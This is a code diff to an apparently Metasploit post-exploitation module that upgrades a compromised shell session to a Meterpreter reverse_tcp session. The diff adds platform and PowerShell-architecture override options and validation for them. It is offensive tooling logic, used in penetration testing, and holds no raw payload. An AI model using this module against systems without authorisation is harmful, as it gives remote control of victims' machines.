@@ -9,6 +9,9 @@ class MetasploitModule < Msf::Post
   include Post::Architecture
   include Post::Windows::Powershell
 
+  VALID_PSH_ARCH_OVERRIDE = ['x64', 'x86']
+  VALID_PLATFORM_OVERRIDE = Msf::Platform.find_children.map { |plat| plat.realname.downcase }
+
   def initialize(info = {})
     super(
       update_info(
@@ -41,6 +44,10 @@ class MetasploitModule < Msf::Post
                  [true, 'How long to wait (in seconds) for the session to come back.', 30]),
       OptEnum.new('WIN_TRANSFER',
                   [true, 'Which method to try first to transfer files on a Windows target.', 'POWERSHELL', ['POWERSHELL', 'VBS']]),
+      OptEnum.new('PLATFORM_OVERRIDE',
+                  [false, 'Define the platform to use.', nil, VALID_PLATFORM_OVERRIDE]),
+      OptEnum.new('PSH_ARCH_OVERRIDE',
+                  [false, 'Define the powershell architecture to use', nil, VALID_PSH_ARCH_OVERRIDE]),
       OptString.new('PAYLOAD_OVERRIDE',
                     [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil]),
       OptString.new('BOURNE_PATH',
@@ -81,55 +88,86 @@ class MetasploitModule < Msf::Post
     lport = datastore['LPORT']
 
     # Handle platform specific variables and settings
-    case session.platform
-    when 'windows', 'win'
-      platform = 'windows'
-      lplat = [Msf::Platform::Windows]
-      arch = get_os_architecture
-      case arch
-      when ARCH_X64
-        payload_name = 'windows/x64/meterpreter/reverse_tcp'
-        psh_arch = 'x64'
-      when ARCH_X86
-        payload_name = 'windows/meterpreter/reverse_tcp'
-        psh_arch = 'x86'
-      else
-        print_error('Target is running Windows on an unsupported architecture such as Windows ARM!')
+    if datastore['PAYLOAD_OVERRIDE']
+      unless datastore['PLATFORM_OVERRIDE']
+        print_error('Please pair PAYLOAD_OVERRIDE with a PLATFORM_OVERRIDE.')
         return nil
       end
-      larch = [arch]
-      vprint_status('Platform: Windows')
-    when 'osx'
-      platform = 'osx'
-      payload_name = 'osx/x64/meterpreter/reverse_tcp'
-      lplat = [Msf::Platform::OSX]
-      larch = [ARCH_X64]
-      vprint_status('Platform: OS X')
-    when 'solaris'
-      platform = 'python'
-      payload_name = 'python/meterpreter/reverse_tcp'
-      vprint_status('Platform: Solaris')
+      unless datastore['PLATFORM_OVERRIDE'].in? VALID_PLATFORM_OVERRIDE
+        print_error('Please provide a valid PLATFORM_OVERRIDE')
+        return nil
+      end
+      payload_name = datastore['PAYLOAD_OVERRIDE']
+      payload = framework.payloads.create(payload_name)
+      platform = datastore['PLATFORM_OVERRIDE']
+      unless payload
+        print_error('Please provide a valid payload for PAYLOAD_OVERRIDE.')
+        return nil
+      end
+      if platform.downcase == 'windows' || platform.downcase == 'win'
+        unless datastore['PSH_ARCH_OVERRIDE']
+          print_error('Please provide a PSH_ARCH_OVERRIDE')
+          return nil
+        end
+        unless datastore['PSH_ARCH_OVERRIDE'].in? VALID_PSH_ARCH_OVERRIDE
+          print_error('Please provide a valid PSH_ARCH_OVERRIDE')
+          return nil
+        end
+        psh_arch = datastore['PSH_ARCH_OVERRIDE']
+      end
+      lplat = payload.platform.platforms
+      larch = payload.arch
     else
-      # Find the best fit, be specific with uname to avoid matching hostname or something else
-      target_info = cmd_exec('uname -ms')
-      if target_info =~ /linux/i && target_info =~ /86/
-        # Handle linux shells that were identified as 'unix'
-        platform = 'linux'
-        payload_name = 'linux/x86/meterpreter/reverse_tcp'
-        lplat = [Msf::Platform::Linux]
-        larch = [ARCH_X86]
-        vprint_status('Platform: Linux')
-      elsif target_info =~ /darwin/i
+      case session.platform
+      when 'windows', 'win'
+        platform = 'windows'
+        lplat = [Msf::Platform::Windows]
+        arch = get_os_architecture
+        case arch
+        when ARCH_X64
+          payload_name = 'windows/x64/meterpreter/reverse_tcp'
+          psh_arch = 'x64'
+        when ARCH_X86
+          payload_name = 'windows/meterpreter/reverse_tcp'
+          psh_arch = 'x86'
+        else
+          print_error('Target is running Windows on an unsupported architecture such as Windows ARM!')
+          return nil
+        end
+        larch = [arch]
+        vprint_status('Platform: Windows')
+      when 'osx'
         platform = 'osx'
         payload_name = 'osx/x64/meterpreter/reverse_tcp'
         lplat = [Msf::Platform::OSX]
         larch = [ARCH_X64]
         vprint_status('Platform: OS X')
-      elsif remote_python_binary
-        # Generic fallback for OSX, Solaris, Linux/ARM
+      when 'solaris'
         platform = 'python'
         payload_name = 'python/meterpreter/reverse_tcp'
-        vprint_status('Platform: Python [fallback]')
+        vprint_status('Platform: Solaris')
+      else
+        # Find the best fit, be specific with uname to avoid matching hostname or something else
+        target_info = cmd_exec('uname -ms')
+        if target_info =~ /linux/i && target_info =~ /86/
+          # Handle linux shells that were identified as 'unix'
+          platform = 'linux'
+          payload_name = 'linux/x86/meterpreter/reverse_tcp'
+          lplat = [Msf::Platform::Linux]
+          larch = [ARCH_X86]
+          vprint_status('Platform: Linux')
+        elsif target_info =~ /darwin/i
+          platform = 'osx'
+          payload_name = 'osx/x64/meterpreter/reverse_tcp'
+          lplat = [Msf::Platform::OSX]
+          larch = [ARCH_X64]
+          vprint_status('Platform: OS X')
+        elsif remote_python_binary
+          # Generic fallback for OSX, Solaris, Linux/ARM
+          platform = 'python'
+          payload_name = 'python/meterpreter/reverse_tcp'
+          vprint_status('Platform: Python [fallback]')
+        end
       end
     end
 
@@ -137,8 +175,6 @@ class MetasploitModule < Msf::Post
       print_error("Shells on the target platform, #{session.platform}, cannot be upgraded to Meterpreter at this time.")
       return nil
     end
-
-    payload_name = datastore['PAYLOAD_OVERRIDE'] if datastore['PAYLOAD_OVERRIDE']
 
     vprint_status("Upgrade payload: #{payload_name}")
 
@@ -156,7 +192,7 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    case platform
+    case platform.downcase
     when 'windows'
       if session.type == 'powershell'
         template_path = Rex::Powershell::Templates::TEMPLATE_DIR
